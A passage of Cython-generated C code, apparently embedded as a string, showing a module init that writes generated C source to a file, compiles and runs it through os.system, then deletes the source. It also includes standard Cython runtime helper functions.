(unlikely(!__pyx_t_1)) __PYX_ERR(0, 4063, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4062, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4063, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __P""yx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4065, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4064, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_u_L); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4065, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4067, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4066, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_u_lib_lpython); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4067, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4069, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4068, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_COMPILE_FILE, __pyx_t_5) < 0) __PYX_ERR(0, 4057, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  /*with:*/ {\n    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4073, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4073, __pyx_L1_error)\n    ""__Pyx_GOTREF(__pyx_t_1);\n    __Pyx_GIVEREF(__pyx_t_5);\n    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);\n    __Pyx_INCREF(__pyx_n_u_w);\n    __Pyx_GIVEREF(__pyx_n_u_w);\n    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_w);\n    __pyx_t_5 = 0;\n    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4073, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 4073, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4073, __pyx_L3_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4073, __pyx_L3_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_1 = __pyx_t_2;\n    __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    /*try:*/ {\n      {\n        __Pyx_PyThreadState_declare\n        __Pyx_PyThreadState_assign\n        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);\n        __Pyx_XGOTREF(__pyx_t_7);\n        __Pyx_XGOTREF(__pyx_t_8);\n        __Pyx_XGOTREF(__pyx_t_9);\n        /*try:*/ {\n          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 4073, __pyx_L7_error)\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4074, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_1);\n          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4074, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_C_SOURCE); if (unlikely(!__pyx_t_1)) __PYX_E""RR(0, 4074, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_1);\n          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4074, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_2);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n        }\n        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        goto __pyx_L12_try_end;\n        __pyx_L7_error:;\n        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        /*except:*/ {\n          __Pyx_AddTraceback(\"source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 4073, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_2);\n          __Pyx_GOTREF(__pyx_t_1);\n          __Pyx_GOTREF(__pyx_t_5);\n          __pyx_t_3 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4073, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_3);\n          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_3, NULL);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 4073, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_10);\n          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_10);\n          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n          if (__pyx_t_4 < 0) __PYX_ERR(0, 4073, __pyx_L9_except_error)\n          __pyx_t_11 = ((!(__pyx_t_4 != 0)) != 0);\n          if (__pyx_t_11) {\n            __Pyx_GIVEREF(__pyx_t_2);\n            __Pyx_GIVEREF(__pyx_t_1);\n            __Pyx_XGIVEREF(__pyx_t_5);""\n            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_1, __pyx_t_5);\n            __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_5 = 0;\n            __PYX_ERR(0, 4073, __pyx_L9_except_error)\n          }\n          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n          goto __pyx_L8_exception_handled;\n        }\n        __pyx_L9_except_error:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        goto __pyx_L1_error;\n        __pyx_L8_exception_handled:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        __pyx_L12_try_end:;\n      }\n    }\n    /*finally:*/ {\n      /*normal exit:*/{\n        if (__pyx_t_6) {\n          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__10, NULL);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 4073, __pyx_L1_error)\n          __Pyx_GOTREF(__pyx_t_9);\n          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        }\n        goto __pyx_L6;\n      }\n      __pyx_L6:;\n    }\n    goto __pyx_L16;\n    __pyx_L3_error:;\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    goto __pyx_L1_error;\n    __pyx_L16:;\n  }\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrS""tr(__pyx_t_5, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_dirname); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_GIVEREF(__pyx_t_3);\n  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);\n  __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_exist_ok, Py_True) < 0) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4076, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4077, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4077, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_5)) __PYX_ERR(0"", 4078, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_2 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4078, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4080, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4079, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_kp_u__3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4080, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_COMPILE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4082, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_5, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4081, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_u__3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4082, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_RUN); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4084, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4083, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4077, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DEC""REF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4086, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4086, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4086, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4086, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  /*--- Wrapped vars code ---*/\n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_5);\n  if (__pyx_m) {\n    if (__pyx_d) {\n      __Pyx_AddTraceback(\"init source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    Py_CLEAR(__pyx_m);\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, \"init source\");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #elif PY_MAJOR_VERSION >= 3\n  return __pyx_m;\n  #else\n  return;\n  #endif\n}\n\n/* --- Runtime support code --- */\n/* Refnanny */\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m ""= PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, \"RefNannyAPI\");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n/* PyObjectGetAttrStr */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n#if PY_MAJOR_VERSION < 3\n    if (likely(tp->tp_getattr))\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\n#endif\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n/* GetBuiltinName */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\n    if (unlikely(!result)) {\n        PyErr_Format(PyExc_NameError,\n#if PY_MAJOR_VERSION >= 3\n            \"name '%U' is not defined\", name);\n#else\n            \"name '%.200s' is not defined\", PyString_AS_STRING(name));\n#endif\n    }\n    return result;\n}\n\n/* Import */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *empty_list = 0;\n    PyObject *module = 0;\n    PyObject *global_dict = 0;\n    PyObject *empty_dict = 0;\n    PyObject *list;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_import;\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\n    if (!py_import)\n        goto bad;\n    #endif\n    if (from_list)\n        list = from_list;\n    else {\n        empty_list = PyList_New(0);\n        if (!empty_list)\n            goto bad;\n        list = empty_list;\n    }\n    global_dict = PyModule_GetDict(__pyx_m);\n    if (!global_dict)\n        goto bad;\n    empty_dict = PyDict_New();\n    if (!empty_dict)\n        goto bad;\n    {\n        #if PY_MAJOR_VERSION >= 3\n        if (level == -1) {\n            if ((1) && (strchr(_""_Pyx_MODULE_NAME, '.'))) {\n                module = PyImport_ImportModuleLevelObject(\n                    name, global_dict, empty_dict, list, 1);\n                if (!module) {\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\n                        goto bad;\n                    PyErr_Clear();\n                }\n            }\n            level = 0;\n        }\n        #endif\n        if (!module) {\n            #if PY_MAJOR_VERSION < 3\n            PyObject *py_level = PyInt_FromLong(level);\n            if (!py_level)\n                goto bad;\n            module = PyObject_CallFunctionObjArgs(py_import,\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\n            Py_DECREF(py_level);\n            #else\n            module = PyImport_ImportModuleLevelObject(\n                name, global_dict, empty_dict, list, level);\n            #endif\n        }\n    }\nbad:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_import);\n    #endif\n    Py_XDECREF(empty_list);\n    Py_XDECREF(empty_dict);\n    return module;\n}\n\n/* PyDictVersioning */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)""->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n/* GetModuleGlobalName */\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if !CYTHON_AVOID_BORROWED_REFS\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    } else if (unlikely(PyErr_Occurred())) {\n        return NULL;\n    }\n#else\n    result = PyDict_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n#endif\n#else\n    result = PyObject_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n/* PyCFunctionFastCall */\n#if CYTHON_FAST_PYCCALL\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\n    PyObject *self = PyCFunction_GET_SELF(func);\n    int flags = PyCFunction_GET_FLAGS(func);\n    assert(PyCFunction_Check(func));\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\n    assert(nargs >= 0);\n    assert(nargs == 0 || args != NULL);\n    /* ""_PyCFunction_FastCallDict() must not be called with an exception set,\n       because it may clear it (directly or indirectly) and so the\n       caller loses its exception */\n    assert(!PyErr_Occurred());\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\n    } else {\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\n    }\n}\n#endif\n\n/* PyFunctionFastCall */\n#if CYTHON_FAST_PYCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    /* XXX Perhaps we should create a specialized\n       PyFrame_New() that doesn't take locals, but does\n       take builtins without sanity checking them.\n       */\n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\n#if 1 || PY_VERSION_HEX < 0x030600B1\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n#if PY_MAJOR_VERSION >= 3\n    PyObject *kwdefs;\n#endif\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObje""ct *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (Py_EnterRecursiveCall((char*)\" while calling a Python object\")) {\n        return NULL;\n    }\n    if (\n#if PY_MAJOR_VERSION >= 3\n            co->co_kwonlyargcount == 0 &&\n#endif\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | 